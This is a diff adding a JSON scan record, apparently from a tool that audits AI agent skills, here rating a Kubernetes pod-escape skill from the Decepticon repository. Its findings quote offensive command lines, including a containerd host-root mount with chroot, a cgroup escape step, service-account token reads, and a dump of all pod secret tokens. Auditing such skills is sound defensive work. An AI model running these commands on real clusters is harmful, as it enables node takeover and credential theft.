@@ -1,0 +1,138 @@
+{
+  "id": "bittersecurity__decepticon__packages~decepticon~decepticon~skills~standard~cloud~container~k8s-pod-escape",
+  "owner": "BitterSecurity",
+  "repo": "Decepticon",
+  "path": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape",
+  "name": "k8s-pod-escape",
+  "description": "Kubernetes pod escape to node — privileged container abuse, hostPath mount escape, hostPID/hostIPC, capability misuse (SYS_ADMIN, SYS_PTRACE), runC CVE chains. Pivots from RCE-in-pod to full node compromise.",
+  "stars": 6567,
+  "category": "coding",
+  "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+  "contentHash": "77d1ee14e73324614bf0ddcacca9c16c1f3ffc500b697e9a17665bf621310dc6",
+  "repoCreatedAt": "2025-06-06T12:55:02Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 20,
+        "excerpt": "cat /proc/self/status | grep -E '^(Cap|Seccomp|NoNewPriv)'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 33,
+        "excerpt": "curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/default/pods",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "kubernetes.default.svc"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 42,
+        "excerpt": "grep CapEff /proc/self/status",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 57,
+        "excerpt": "mount | grep -E '/host|/node|docker.sock|/etc|/root'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 63,
+        "excerpt": "ctr -a /run/containerd/containerd.sock run --rm -t --privileged --mount type=bind,src=/,dst=/host,options=rbind alpine escape sh -c 'chroot /host'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 70,
+        "excerpt": "ps auxf | head",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 84,
+        "excerpt": "grep CapEff /proc/self/status   # 00000000a82425fb or similar with bit 21 set",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 97,
+        "excerpt": "sh -c \"echo \\$\\$ > /tmp/x/cgroup.procs\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 107,
+        "excerpt": "cat > Dockerfile <<'EOF'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 122,
+        "excerpt": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 124,
+        "excerpt": "curl -sk -H \"Authorization: Bearer $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 139,
+        "excerpt": "find /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token -exec cat {} \\; -exec echo --- \\;",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 10,
+      "network": 2
+    },
+    "score": 92,
+    "band": "low",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 1,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 92,
+      "rulesVersion": "1.3.0"
+    }
+  ]
+}
